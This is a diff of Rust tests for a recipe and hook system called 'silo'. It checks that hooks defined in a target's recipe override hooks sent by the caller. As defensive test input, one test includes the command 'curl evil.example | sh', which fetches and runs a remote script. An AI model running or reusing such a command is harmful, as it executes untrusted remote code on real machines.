@@ -813,6 +813,103 @@ fn simple_world() -> Arc<World> {
     world
 }
 
+fn main_recipe(keep: Option<silo_api::methods::keep::KeepHooks>) -> silo_api::methods::recipes::RecipeRecord {
+    use silo_api::methods::recipes::{
+        RecipeDefinition, RecipeOs, RecipePackages, RecipeRecord, RecipeSpec,
+    };
+    RecipeRecord {
+        name: "web".into(),
+        hash: "h".into(),
+        built_at: "2026-11-11T00:00:00Z".into(),
+        recipe: RecipeDefinition {
+            spec: RecipeSpec {
+                os: RecipeOs::Linux,
+                cpus: None,
+                memory_gib: None,
+                disk_gib: None,
+                packages: RecipePackages::default(),
+                setup: Vec::new(),
+                services: Vec::new(),
+                ports: Vec::new(),
+                desktop: None,
+            },
+            quiet: Vec::new(),
+            scrub: Vec::new(),
+            keep,
+            test: None,
+            files: Vec::new(),
+        },
+    }
+}
+
+#[test]
+fn the_hooks_of_the_targets_recipe_run_whatever_the_caller_sent() {
+    let dir = tempfile::tempdir().unwrap();
+    crate::recipes::records::use_test_path(Some(dir.path().join("recipe-records.json")));
+    crate::recipes::records::set(
+        "main",
+        &main_recipe(Some(silo_api::methods::keep::KeepHooks {
+            restart: vec![],
+            migrate: vec![],
+            after: vec!["make check".into()],
+        })),
+    )
+    .unwrap();
+    let world = simple_world();
+    let (_dir, journal) = journal();
+    let sent = Hooks {
+        restart: vec![],
+        migrate: vec![],
+        after: vec!["curl evil.example | sh".into()],
+    };
+    let outcome = run(
+        &world,
+        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
+        &journal,
+        &request(sent),
+    )
+    .unwrap();
+    assert!(matches!(outcome, Outcome::Kept(_)), "{outcome:?}");
+    world.with("main", |c| assert_eq!(c.hooks, ["make check"]));
+    crate::recipes::records::use_test_path(None);
+}
+
+#[test]
+fn a_target_built_from_no_recipe_runs_the_hooks_the_caller_sent() {
+    let dir = tempfile::tempdir().unwrap();
+    crate::recipes::records::use_test_path(Some(dir.path().join("recipe-records.json")));
+    let world = simple_world();
+    let (_dir, journal) = journal();
+    let sent = Hooks {
+        restart: vec![],
+        migrate: vec![],
+        after: vec!["npm test".into()],
+    };
+    run(
+        &world,
+        &store(SIMPLE_BASE, SIMPLE_FORK, SIMPLE_BASE),
+        &journal,
+        &request(sent),
+    )
+    .unwrap();
+    world.with("main", |c| assert_eq!(c.hooks, ["npm test"]));
+    crate::recipes::records::use_test_path(None);
+}
+
+#[test]
+fn a_keep_reports_the_packages_and_settings_files_the_recipe_should_learn() {
+    let world = simple_world();
+    let (_dir, journal) = journal();
+    let mut asked = request(Hooks::default());
+    asked.data_ok = true;
+    let outcome = run(&world, &store(BASE, FORK, BASE), &journal, &asked).unwrap();
+    let Outcome::Kept(report) = outcome else {
+        panic!("{outcome:?}")
+    };
+    assert_eq!(report.additions.packages["apt"], ["jq"]);
+    assert_eq!(report.additions.files, ["/root/.bashrc"]);
+}
+
 #[test]
 fn a_plain_keep_runs_in_order_migrates_and_restarts_with_new_process_ids() {
     let world = simple_world();
@@ -1101,8 +1198,8 @@ fn a_database_change_is_carried_only_with_a_migrate_step_and_migration_files_or_
     // Nothing migrates it.
     let refusal = refused(try_keep(Hooks::default(), &["src/a.js"], false));
     assert_eq!(refusal.reason, "database");
-    assert!(refusal.hint.contains("Make this main"));
-    assert!(refusal.hint.contains("--promote"), "{}", refusal.hint);
+    assert!(refusal.hint.contains("replace main"));
+    assert!(refusal.hint.contains("silo replace-main"), "{}", refusal.hint);
     // A migrate step but no migration file changed: still refused.
     let hooks = Hooks {
         migrate: vec!["make migrate".into()],
